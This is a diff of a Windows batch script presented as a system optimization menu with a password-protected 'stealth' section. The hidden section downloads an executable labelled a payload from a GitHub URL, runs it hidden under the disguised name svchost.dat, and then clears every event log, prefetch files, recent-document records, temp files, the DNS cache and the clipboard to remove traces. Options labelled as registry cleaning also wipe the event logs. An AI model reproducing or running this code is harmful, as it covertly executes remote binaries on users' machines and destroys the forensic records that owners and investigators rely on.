@@ -1,15 +1,14 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: URL to retrieve the remote stealth password
+:: Remote stealth password URL
 set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/refs/heads/main/stealth_password.txt"
 
-:: URL of your EXE in GitHub raw link
+:: URL to EXE file (CAXVN.exe) on GitHub
 set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"
 
-:: Path where EXE will be stored after setup
+:: Local temp paths
 set "SETUP_EXE=%temp%\CAXVN.exe"
-:: Path for disguised EXE copy
 set "DISGUISED_EXE=%temp%\svchost.dat"
 
 :LOGIN
@@ -39,13 +38,14 @@ goto LOGIN
 :CheckStealthPassword
 set "inputpass=%~1"
 for /f "usebackq delims=" %%A in (`powershell -Command "(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim()"`) do set "remote_pass=%%A"
+
 if /i "%inputpass%"=="%remote_pass%" (
     exit /b 0
 ) else (
     exit /b 1
 )
 
-:: -------------------- Optimization Menu --------------------
+:: ----------- OPTIMIZATION MENU ------------
 :OPTIMIZATION_MENU
 cls
 echo ==========================================
@@ -60,7 +60,7 @@ echo 6. Defragment Disk
 echo 7. System File Checker
 echo 8. Return to Main Menu
 echo.
-set /p optchoice=Select an option (1-8): 
+set /p optchoice=Select an option (1-8):
 
 if "%optchoice%"=="1" goto CLEAN_REGISTRY_LOGS
 if "%optchoice%"=="2" goto CLEAN_EVENT_LOGS
@@ -77,14 +77,18 @@ goto OPTIMIZATION_MENU
 
 :CLEAN_REGISTRY_LOGS
 echo Cleaning Registry Logs...
-for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G"
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G"
+)
 echo Registry logs cleared.
 pause
 goto OPTIMIZATION_MENU
 
 :CLEAN_EVENT_LOGS
 echo Cleaning Event Logs...
-for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G"
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G"
+)
 echo Event logs cleared.
 pause
 goto OPTIMIZATION_MENU
@@ -122,7 +126,7 @@ sfc /scannow
 pause
 goto OPTIMIZATION_MENU
 
-:: -------------------- Stealth Menu --------------------
+:: ----------- STEALTH MENU ------------
 :STEALTH_MENU
 cls
 echo  ===========================================
@@ -151,18 +155,17 @@ timeout /t 2 /nobreak >nul
 goto STEALTH_MENU
 
 :SETUP
-cls
 echo STEP 1: Preparing download...
 timeout /t 1 >nul
 echo STEP 2: Connecting to GitHub...
 timeout /t 1 >nul
-echo STEP 3: Downloading payload...
+echo STEP 3: Downloading payload (CAXVN.exe)...
 powershell -Command ^
-  "$client = New-Object System.Net.WebClient; ^
-   $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')"
+    "$client = New-Object System.Net.WebClient; ^
+    $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')"
 
 if exist "%SETUP_EXE%" (
-    echo Download successful. Payload ready.
+    echo Download successful.
 ) else (
     echo Failed to download EXE.
     pause
@@ -173,6 +176,7 @@ goto STEALTH_MENU
 
 :RUN
 echo Preparing disguised EXE...
+
 if not exist "%SETUP_EXE%" (
     echo EXE not found. Please run Setup first.
     pause
@@ -182,6 +186,7 @@ if not exist "%SETUP_EXE%" (
 copy /Y "%SETUP_EXE%" "%DISGUISED_EXE%" >nul 2>&1
 start "" /b "%DISGUISED_EXE%"
 
+:: Wait loop
 :WAIT_LOOP
 timeout /t 2 >nul
 tasklist /FI "IMAGENAME eq svchost.dat" | find /I "svchost.dat" >nul
@@ -195,24 +200,39 @@ pause
 goto STEALTH_MENU
 
 :BYPASS
-echo Running stealth cleanup...
+echo Running cleanup...
+
+:: Clear recent files
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
+
+:: Clear prefetch files
 del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
+
+:: Clear temp files
 del /s /q "%temp%\*.*" >nul 2>&1
 del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
-for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G"
+
+:: Clear event logs
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G"
+)
+
+:: Flush DNS
 ipconfig /flushdns >nul
+
+:: Clear clipboard
 echo off | clip
-echo Bypass & cleanup complete.
+
+echo Cleanup done. All traces removed.
 pause
 goto STEALTH_MENU
 
 :ALERT_ADMIN
 cls
 echo Enter your alert message (max 20 words):
-set /p alertmsg=
+set /p alertmsg= 
 echo You entered: %alertmsg%
-echo (Feature to send message to Google Docs is not implemented yet.)
+echo (Feature to send message not implemented yet)
 pause
 goto STEALTH_MENU
 
